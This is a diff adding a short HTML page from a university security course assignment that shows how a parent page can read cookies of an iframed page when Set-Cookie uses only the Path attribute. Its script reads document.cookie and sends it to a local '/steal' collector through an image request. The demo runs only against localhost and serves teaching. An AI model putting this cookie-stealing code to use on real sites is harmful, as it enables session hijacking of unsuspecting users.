@@ -1,0 +1,28 @@
+<html>
+<title>
+Attacker Site! BEWARE!!!
+</title>
+
+
+<h1>Successfully stealing cookies</h1>
+Skanda Siva, CS595 - Spring 2022, ODU
+<br><br>
+Demonstration of how a parent page can steal cookies from an iframed page if only the Path attribute is used in Set-Cookie.
+<br><br>
+<p>
+
+<script>
+    document.cookie = 'main=cookie'
+    const iframe = document.createElement('iframe')
+    iframe.src = 'http://localhost:8002/'
+    document.body.appendChild(iframe)
+    document.write(iframe.contentDocument.cookie)
+    console.log(iframe.contentDocument.cookie)
+
+    setTimeout(function() {
+        const p = document.createElement('p')
+        p.innerHTML = document.cookie   /*iframe.contentDocument.cookie */
+        document.body.appendChild(p)
+        new Image().src = 'http://localhost:5002/steal?cookie=' + document.cookie  /*iframe.contentDocument.cookie*/
+}, 5000);
+</script>
